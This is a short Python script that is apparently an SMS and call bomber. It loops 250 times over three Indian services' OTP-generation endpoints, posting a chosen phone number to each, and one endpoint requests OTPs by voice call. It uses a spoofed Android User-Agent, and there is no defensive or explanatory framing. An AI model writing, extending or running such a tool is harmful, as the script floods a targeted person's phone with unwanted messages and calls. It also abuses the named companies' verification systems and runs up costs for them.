import requests
import time
import json

def smsg(number):
    number = str(number)
    
    
   # start_time = time.time()
    
    #while time.time() - start_time < 60:  # Run for 3600 seconds (1 hour)
    for _ in range(250):
        apis = [
            {
                "url": "https://session-service.aakash.ac.in/prod/sess/api/v1/user/phone/otp/",
                "payload": {"action": "generate", "phone": number, "access": "signup"},
                "headers": {"Content-Type": "application/json"}
            },
            {
            "url": "https://api.beatoapp.com/v1/onboarding/generateotp",
            "payload": {"isdcode": "+91", "phone": number, "os": "android", "otptype": "call", "email": "", "resend": True},
            "headers": {"Content-Type": "application/json; charset=utf-8", "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 7 Pro Build/TQ3A.230605.012)", "Host": "api.beatoapp.com", "Connection": "Keep-Alive", "Accept-Encoding": "gzip"}
        },
            {
                "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
                "payload": {"mobile_number": number, "client_id": "kisan-app"},
                "headers": {"Content-Type": "application/json"}
            },
            
            
            # Add more APIs here using the same structure
        ]
     #   for _ in range(200):
        # Iterating through the list of APIs and making requests
        for api in apis:
            response = requests.post(api["url"], json=api["payload"], headers=api["headers"])
            print(f"Request to {api['url']} - Status Code: {response.status_code}")
        
      #  time.sleep(1)  # Sleep for 1 second between iterations

# Example usage:
#smsg("92")  # Replace "1234567890" with the phone number you want to use
